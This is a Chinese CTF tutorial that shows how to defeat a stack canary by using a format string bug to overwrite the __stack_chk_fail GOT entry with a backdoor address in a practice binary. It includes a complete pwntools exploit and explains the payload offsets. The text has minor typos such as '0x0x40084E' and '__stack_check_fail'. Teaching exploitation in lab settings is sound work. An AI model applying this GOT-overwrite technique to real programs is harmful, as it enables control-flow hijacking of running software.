    Bypass-Canary系列-劫持stack_chk_fail函数

    这是本系列的第四篇文章，前面我们讲的都是想办法得到canary的值，但是本篇将介绍如何用格式化字符串漏洞劫持__stack_chk_fail 函数。

    说明：

    当触发Canary报警后，将调用___stack_chk_fail 函数结束程序。

    于是我们就想办法修改__stack_chk_fail 函数，使得触发报警时能执行我们的函数。

    *例题（/Bypass-Canary/bin3）：

    分析程序，发现main函数中存在格式化字符串漏洞。

    printf(&format);

    我们之前说过，利用好格式化字符串漏洞可以做到泄露地址，也可以做到任意地址写入。
    任意地址写入主要用到 %n ，它的作用是将之前打印输出过的字符的个数重新存入到某变量中。
    详情请看笔记《格式化字符串漏洞总结》。
    我们需要知道的是 %n 是写入4字节，%hn是写入2字节，%hhn是写入1字节。

    本题有后门函数，于是我们只要把__stack_chk_fail 函数的地址修改为后门函数即可。

    我们既然要

    先贴上exp吧，然后对exp进行解释。大家看解释的时候可以对照exp来理解。

    exp：

    #coding=utf-8
from pwn import *
p=process('./bin3')
elf=ELF('./bin3')
context.log_level='debug'
backdoor_addr=0x40084E
stack_chk_fail_addr=elf.got['__stack_chk_fail']  #开头有2个下划线

payload=''
#改写__stack_chk_fail的got表,改为后门函数所在的地址
payload += 'a'*5 + '%' + str(backdoor_addr -5) + 'c%8$hn' + p64(stack_chk_fail_addr) + 'a'*100
#最后跟上100字符是为了故意触发cannary保护程序，好让执行后门函数
#gdb.attach(p,'b *0x04008DB')
p.recv()
p.sendline(payload)
p.interactive()

    重点关注payload，一上来先是5字节的a，这个怎么来的之后会讲到。
    先看后面的：

    ‘%’ + str(backdoor_addr- 5) + ‘c%8$hn’

    这个语句是如何将我们想要输入的数据写入到stack_chk_fail函数里呢。
    既然要打靶，那总要先设好靶子吧。（没错，    stack_chk_fail函数就是靶子）

    举个例子，一般利用格式化字符串漏洞“打靶”的格式 类似如下：

    %2121c%8$hn

    意为将hex(2121)的数据写入到格式化偏移为8的地址当中，写入的是2字节。
    像2121、8 这些数据我采用的都是本题的数据，每个题目数据各不相同，根据具体情况来。
    对这个格式一脸茫然的可以去补补这方面知识嗷。

    backdoor_addr=0x0x40084E
    所以算得 str(backdoor_addr -5)=2121
    为什么要这样算呢，调试发现只需要修改__stack_chk_fail函数的低2字节为0x04E 即可修改为我们后门函数地址，所以我们才会选用 %hn 来写入2字节数据。
    0x084E转换为十进制是 2126 ,说明我们要打印2126个字符才能将2126这个值以hex(2126)的形式写入到偏移为8的地址当中去。
    但为什么还要减去5？这个后面还会讲到。

    那这个偏移8是怎么来的呢。这就涉及到计算格式化字符偏移。
    本题中，运行程序，然后输入：

    AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

    执行结果如下：

    各个偏移之间一般用点号分隔开，便于看清。
    可以看到偏移6的低字节处有41414141即为我们输入的aaaa。

    我们先来计算我们这个格式的长度为多长：

    >>> len('%2121c%8$hn')
11

    由于格式是固定的，所以这11字节是固定的，但是我们需要补齐，补齐到16字节（所谓8字节对齐）。所以还差 16-11 = 5字节。
    好了现在解开谜底，这个5字节的作用你明白了吗。算算打印出来的字符的个数有多少个，我们一开始输入5个字节的a是为了对齐。然后打印2126字节才能是0x84E，所以我们后续还需要通过%c打印 2126-5=2121个数据。

    所以偏移8的来由也就知道了。补齐到16字节后，我们从输入时偏移6的位置来到了偏移8的位置。在偏移8的位置我们放上__stack_chk_fail函数的地址。

    总结：

    解释有点绕口，来做一个总结。
    放上调试截图可能会好理解一些:

    记住 ‘a’*5 的作用是为了补齐16字节，为了对齐而做的填充。我们输入的数据是在偏移为6的位置上，16字节是两个偏移，所以自然而然就把 __stack_check_fail的地址顶到了偏移为8的位置上。于是靶子立好了。
    16字节数据里5字节是填充，剩下的11字节是我们为了任意地址写而构造的语句。
    我们需要打印 2126 字节才能将 hex(2126) 即0x084E 写入指定地址。

    我们再次来看这个格式会好理解很多：

    %2121c%8$hn

    之前已经打印了5字节的‘a’了，所以还需要 2126-5=2121，所以这里是2121
    然后程序就会把全部打印的2126数据以hex(2126)形式写入到偏移为8的地址中去，写入2字节。

    如果还不能懂的话，就去恶补格式化字符串漏洞的相关知识叭。 QAQ

    现在我们已经把 __stack_check_fail函数低2字节的内容改写为了 0x084E，整体地址变成了后门函数的地址。于是再输入 过多字符 故意导致溢出触发报警，调用 __stack_check_fail 函数，执行我们的后门函数。
